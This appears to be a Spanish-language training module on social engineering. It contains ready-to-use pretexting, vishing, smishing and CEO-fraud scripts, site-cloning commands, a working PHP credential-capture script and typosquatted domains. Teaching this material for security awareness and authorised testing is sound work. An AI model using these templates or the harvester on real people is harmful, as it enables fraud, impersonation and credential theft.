# Fundamentos de Ingeniería Social

## ¿Qué es Ingeniería Social?

```
Manipulación psicológica para que personas:
• Revelen información confidencial
• Realicen acciones específicas
• Concedan acceso no autorizado

Objetivo: Explotar el eslabón más débil → El humano

Estadísticas:
• 98% de ciberataques involucran ingeniería social
• 90% de brechas de datos comienzan con phishing
• Costo promedio: $4.65 millones por incidente
```

---

## Principios de Cialdini

### **6 Principios de Influencia:**

```
1. RECIPROCIDAD
   • Si das, recibes
   • Ejemplo: "Te ayudé antes, ahora ayúdame"

2. COMPROMISO Y CONSISTENCIA
   • Personas mantienen comportamientos previos
   • Ejemplo: "Antes confiaste en mí"

3. PRUEBA SOCIAL
   • Seguir lo que otros hacen
   • Ejemplo: "Todos ya actualizaron sus contraseñas"

4. AUTORIDAD
   • Obedecer figuras de autoridad
   • Ejemplo: "Soy del departamento de IT"

5. AGRADO
   • Personas dicen sí a quien les cae bien
   • Ejemplo: Construir rapport

6. ESCASEZ
   • Valor de lo limitado o urgente
   • Ejemplo: "Solo tienes 24 horas para verificar tu cuenta"
```

---

## Vectores de Ataque

### **Tipos de Ingeniería Social:**

```
PHISHING
• Emails masivos fraudulentos
• Objetivo: Credenciales, malware

SPEAR PHISHING
• Emails dirigidos a persona específica
• Personalizado, investigación previa

WHALING
• Spear phishing a ejecutivos (CEO, CFO)
• Alto valor, alto riesgo

VISHING (Voice Phishing)
• Por teléfono
• Ejemplo: "Soy de soporte técnico"

SMISHING (SMS Phishing)
• Por mensajes de texto
• Links maliciosos

PRETEXTING
• Crear escenario falso
• Ejemplo: Hacerse pasar por proveedor

BAITING
• Ofrecer algo atractivo
• Ejemplo: USB con "Bonos 2024" en estacionamiento

QUID PRO QUO
• Intercambio de favores
• Ejemplo: "Te ayudo con tu computadora"

TAILGATING
• Seguir a alguien para acceso físico
• Ejemplo: "Olvidé mi tarjeta"
```

---

## Ciclo del Ataque de Ingeniería Social

```
1. RECOPILACIÓN DE INFORMACIÓN
   • OSINT sobre objetivo
   • Redes sociales
   • LinkedIn, Facebook, Twitter
   • Sitio web corporativo

2. ESTABLECER RELACIÓN
   • Construir confianza
   • Rapport
   • Pretexto creíble

3. EXPLOTACIÓN
   • Manipulación
   • Solicitar información/acción
   • Entregar payload

4. EJECUCIÓN
   • Objetivo realiza acción
   • Acceso obtenido
   • Información extraída

5. EXTRACCIÓN
   • Salir sin levantar sospechas
   • Borrar huellas
   • Mantener acceso si es necesario
```

---

# Técnicas de Manipulación

## Pretexting

### **Creación de Pretextos Efectivos**

```
Elementos de un buen pretexto:

1. CREDIBILIDAD
   • Rol plausible
   • Conocimiento del contexto
   • Terminología correcta

2. URGENCIA
   • Presión de tiempo
   • Consecuencias de no actuar

3. AUTORIDAD
   • Posición de poder
   • Nombre dropping

4. DETALLES ESPECÍFICOS
   • Información real mezclada
   • Datos que solo "interno" sabría
```

---

### **Ejemplos de Pretextos:**

```
IT SUPPORT
"Hola, soy Juan del departamento de IT. Estamos actualizando 
los sistemas de seguridad y necesito verificar tu contraseña 
actual para migrarla al nuevo sistema. Es urgente, el cambio 
se realiza en 2 horas."

PROVEEDOR/VENDOR
"Buenos días, soy de [Proveedor conocido]. Tenemos un 
problema con su factura del mes pasado. Necesito confirmar 
algunos datos de su cuenta para procesarla."

RECURSOS HUMANOS
"Hola, soy Ana de RRHH. Estamos actualizando los datos de 
nómina y necesito que confirmes tu información bancaria. 
Por favor responde antes de las 5pm o tu pago se retrasará."

EJECUTIVO (CEO FRAUD)
"[Nombre], necesito que hagas una transferencia urgente a 
este proveedor. Estoy en reunión y no puedo llamar. Es 
confidencial, no lo comentes con nadie."
```

---

## Vishing (Voice Phishing)

### **Técnicas de Vishing:**

```
PREPARACIÓN:
• Investigar objetivo (LinkedIn, sitio web)
• Conocer estructura organizacional
• Preparar script
• Spoofear caller ID si es posible

EJECUCIÓN:
1. Establecer autoridad rápidamente
2. Crear urgencia
3. Pedir información "de verificación"
4. Solicitar acción específica

EJEMPLO DE SCRIPT:
"Buenos días, habla Carlos del departamento de seguridad 
de [Banco]. Detectamos actividad sospechosa en su cuenta 
terminada en [últimos 4 dígitos obtenidos de OSINT]. 
Para verificar su identidad, necesito que confirme su 
número de cuenta completo y código de seguridad."
```

---

## Smishing (SMS Phishing)

### **Ejemplos de Mensajes:**

```
BANCO:
"[Banco]: Detectamos actividad inusual. Verifique su cuenta 
en: bit.ly/banco-seguridad"

PAQUETERÍA:
"Su paquete está detenido en aduana. Pague la tarifa en: 
[link]"

PREMIO:
"¡Felicidades! Ganaste $500. Reclama aquí: [link]"

COVID/SALUD:
"Ministerio de Salud: Agenda tu vacuna COVID: [link]"

IMPUESTOS:
"Hacienda: Tienes un reembolso pendiente de $1,200. 
Solicítalo: [link]"
```

---

## CEO Fraud (Business Email Compromise)

### **Técnica:**

```
1. INVESTIGACIÓN
   • Identificar CEO/CFO
   • Entender jerarquía
   • Buscar proveedores habituales

2. SPOOFING
   • Email similar: ceo@empresa.com → ce0@empresa.com
   • Display name correcto
   • Firma similar

3. TIMING
   • Cuando CEO está de viaje
   • Viernes tarde
   • Antes de festivos

4. MENSAJE
"[Empleado Finanzas],

Necesito que hagas una transferencia urgente a este 
proveedor. Estoy en reunión con cliente y no puedo 
llamar. Es para cerrar un contrato importante.

Proveedor: [Nombre real]
Cuenta: [Cuenta del atacante]
Monto: $50,000

Por favor hazlo de inmediato y confirma.
Es confidencial, no lo comentes con nadie todavía.

Saludos,
[Nombre CEO]"
```

---

# Phishing

## Anatomía de un Email de Phishing

### **Componentes Clave:**

```
1. REMITENTE CREÍBLE
   • Display name conocido
   • Dominio similar (typosquatting)
   • Dirección spoofed

2. ASUNTO ATRACTIVO
   • Urgencia
   • Curiosidad
   • Miedo
   • Beneficio

3. CONTENIDO CONVINCENTE
   • Logo oficial
   • Formato similar al real
   • Lenguaje profesional
   • Personalización

4. CALL TO ACTION
   • Link malicioso
   • Adjunto malicioso
   • Formulario falso

5. SENTIDO DE URGENCIA
   • "En 24 horas..."
   • "Última oportunidad..."
   • "Tu cuenta será suspendida..."
```

---

### **Ejemplos de Asuntos Efectivos:**

```
URGENCIA:
• "Acción requerida: Tu cuenta será suspendida"
• "URGENTE: Verificación de seguridad necesaria"
• "Último aviso: Actualiza tu información"

CURIOSIDAD:
• "Tienes un mensaje nuevo de [Nombre conocido]"
• "Alguien compartió un documento contigo"
• "No podrás creer esto..."

AUTORIDAD:
• "Mensaje del CEO: Lectura obligatoria"
• "IT Security Alert"
• "Notificación de RRHH"

BENEFICIO:
• "Has recibido un bono"
• "Reembolso de impuestos aprobado"
• "Gift card de $100 disponible"
```

---

## Clonación de Sitios Web

### **Herramientas:**

```bash
# HTTrack - Clonar sitio completo
sudo apt install httrack

# Clonar sitio
httrack https://ejemplo.com -O /var/www/phishing/ejemplo

# Social Engineering Toolkit (SET)
sudo setoolkit

# Wget (simple)
wget -mkEpnp https://ejemplo.com

# GoPhish (profesional)
# Veremos en sección siguiente
```

---

### **Modificar Sitio Clonado:**

```html
<!-- Original form -->
<form action="https://ejemplo.com/login" method="POST">
    <input type="text" name="username">
    <input type="password" name="password">
    <button>Login</button>
</form>

<!-- Modificado para capturar credenciales -->
<form action="capture.php" method="POST">
    <input type="text" name="username">
    <input type="password" name="password">
    <button>Login</button>
</form>
```

---

### **Script de Captura (capture.php):**

```php
<?php
// Capturar credenciales
$username = $_POST['username'];
$password = $_POST['password'];

// Guardar en archivo
$file = fopen('credentials.txt', 'a');
fwrite($file, "Username: $username | Password: $password | Time: " . date('Y-m-d H:i:s') . "\n");
fclose($file);

// Redirigir a sitio real (para no levantar sospechas)
header('Location: https://ejemplo.com/login?error=invalid');
exit();
?>
```

---

## Hosting del Sitio Falso

### **Opciones:**

```
1. VPS/SERVIDOR PROPIO
   • DigitalOcean, AWS, Vultr
   • Control total
   • Requiere configuración

2. NGROK (Túnel temporal)
   • Rápido para testing
   • URL dinámica

3. SERVEO (Similar a ngrok)
   • SSH forwarding

4. INFRAESTRUCTURA RED TEAM
   • Dominio similar (typosquatting)
   • SSL certificate (Let's Encrypt)
   • Redirectores
```

---

### **Dominio Similar (Typosquatting):**

```
OBJETIVO: amazon.com

VARIACIONES:
• arnazon.com (rn → m)
• amazom.com (n → m)
• amaz0n.com (o → 0)
• amazon-security.com
• amazon-verify.com
• secure-amazon.com
• amazon.co.uk (diferente TLD)
```